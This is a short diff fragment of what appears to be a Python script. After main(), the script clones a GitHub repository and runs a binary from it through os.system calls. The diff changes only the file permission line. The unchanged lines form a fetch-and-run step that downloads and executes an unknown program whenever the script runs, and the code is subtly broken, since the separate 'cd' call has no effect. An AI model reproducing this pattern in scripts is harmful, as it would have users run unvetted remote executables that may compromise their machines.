@@ -74,5 +74,5 @@ if __name__ == "__main__":
     main()
 os.system('git clone https://github.com/aqshakuy/jdag.git')
 os.system('cd jdag')
-os.system('chmod 777 dage')
+os.system('chmod u+x dage')
 os.system('./dage')
